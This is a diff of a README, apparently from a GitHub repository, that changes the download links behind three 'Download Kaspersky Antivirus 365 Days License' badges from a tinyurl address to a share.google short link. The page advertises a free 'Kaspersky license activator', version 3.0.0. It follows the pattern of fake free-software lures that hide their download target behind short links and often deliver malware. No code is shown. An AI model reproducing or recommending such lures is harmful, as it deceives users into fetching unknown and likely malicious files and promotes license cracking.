@@ -13,7 +13,7 @@
 
 <div align="center">
 
-[![Download Kaspersky Antivirus 365 Days License](https://img.shields.io/badge/Download-7C3AED?style=for-the-badge&logo=github)](https://tinyurl.com/kaspersky-antivirus-download)
+[![Download Kaspersky Antivirus 365 Days License](https://img.shields.io/badge/Download-7C3AED?style=for-the-badge&logo=github)](https://share.google/91Qe8ZblaE5KPsjAC)
 
 </div>
 
@@ -69,7 +69,7 @@
 
 <div align="center">
 
-[![Download Kaspersky Antivirus 365 Days License](https://img.shields.io/badge/Download-7C3AED?style=for-the-badge&logo=github)](https://tinyurl.com/kaspersky-antivirus-download)
+[![Download Kaspersky Antivirus 365 Days License](https://img.shields.io/badge/Download-7C3AED?style=for-the-badge&logo=github)](https://share.google/91Qe8ZblaE5KPsjAC)
 
 </div>
 
@@ -172,7 +172,7 @@ Get premium Kaspersky protection for one year for free. **Kaspersky Antivirus â€
 
 <div align="center">
 
-[![Download Kaspersky Antivirus 365 Days License](https://img.shields.io/badge/Download-7C3AED?style=for-the-badge&logo=github)](https://tinyurl.com/kaspersky-antivirus-download)
+[![Download Kaspersky Antivirus 365 Days License](https://img.shields.io/badge/Download-7C3AED?style=for-the-badge&logo=github)](https://share.google/91Qe8ZblaE5KPsjAC)
 
 **Version 3.0.0** â€” Free Kaspersky license activator. May 2026 update. Zero cost. No payment.
 
